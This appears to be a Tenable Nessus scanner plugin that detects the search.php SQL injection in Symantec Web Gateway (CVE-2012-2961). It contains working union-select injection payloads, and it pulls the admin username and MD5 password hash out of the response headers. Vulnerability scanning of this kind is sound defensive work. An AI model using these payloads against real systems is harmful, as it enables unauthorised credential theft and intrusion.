#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(61436);
  script_version("$Revision: 1.11 $");
  script_cvs_date("$Date: 2015/10/16 15:37:30 $");

  script_cve_id("CVE-2012-2961");
  script_bugtraq_id(54425);
  script_osvdb_id(84123, 128846);
  script_xref(name:"TRA", value:"TRA-2012-16");
  script_xref(name:"CERT", value:"108471");
  script_xref(name:"EDB-ID", value:"20044");

  script_name(english:"Symantec Web Gateway search.php SQL Injection (SYM12-011)");
  script_summary(english:"Uses SQL injection to get admin username & password hash.");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A web security application hosted on the remote web server is affected
by a SQL injection vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote web server is hosting a version of Symantec Web Gateway that
is affected by a SQL injection vulnerability.  The vulnerability is in
includes/dbutils.php, and is exploitable via search.php.  A remote,
unauthenticated attacker could exploit this to execute arbitrary
database queries. 

Note that this install is likely affected by several other issues,
although this plugin has not checked for them."
  );
  script_set_attribute(attribute:"see_also", value:"https://www.tenable.com/security/research/tra-2012-16");
  # http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&suid=20120720_00
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?b9817748");
  script_set_attribute(
    attribute:"solution",
    value:
"Upgrade to Symantec Web Gateway version 5.0.3.18 and apply database
upgrade 5.0.0.438."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Symantec Web Gateway 5.0.3 SQLi");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/05/17");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/05/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/08/06");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:symantec:web_gateway");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("symantec_web_gateway_detect.nasl");
  script_require_keys("www/symantec_web_gateway");
  script_require_ports("Services/www", 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:443, php:TRUE);
install = get_install_from_kb(appname:'symantec_web_gateway', port:port, exit_on_fail:TRUE);
base_url = build_url(qs:install['dir'], port:port);
search_page = install['dir'] + '/search.php';

# first get the admin's username
qs = 'type=hostname&value=%27%20union%20select%20username,%202%20%20from%20users%20--%20%27';
username_sqli = search_page + '?' + qs;
res = http_send_recv3(method:'GET', port:port, item:username_sqli, exit_on_fail:TRUE);
headers = parse_http_headers(status_line:res[0], headers:res[1]);
username = headers['location'] - 'clientreport.php?hostname=';

if (strlen(username) == 0)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, 'SWG', base_url);

qs = 'type=hostname&value=%27%20union%20select%20password,%202%20%20from%20users%20--%20%27';
password_sqli = search_page + '?' + qs;
res = http_send_recv3(method:'GET', port:port, item:password_sqli, exit_on_fail:TRUE);
headers = parse_http_headers(status_line:res[0], headers:res[1]);
password = headers['location'] - 'clientreport.php?hostname=';

# if the result doesn't look like an md5 hash, the exploit probably didn't work
if (password !~ '^[0-9A-Fa-f]{32}$')
  audit(AUDIT_WEB_APP_NOT_AFFECTED, 'SWG', base_url);

set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);

if (report_verbosity > 0)
{
  report =
    '\nNessus was able to get the username and password hash of an admin user' +
    '\nby making the following requests and parsing the location field in the' +
    '\nresponse headers :\n\n' +
    build_url(qs:username_sqli, port:port) + '\n' +
    build_url(qs:password_sqli, port:port) + '\n' +
    '\nWhich returned the following information :\n\n' +
    '  Username : ' + username + '\n' +
    '  MD5 hash : ' + password + '\n';
  security_hole(port:port, extra:report);
}
else security_hole(port);
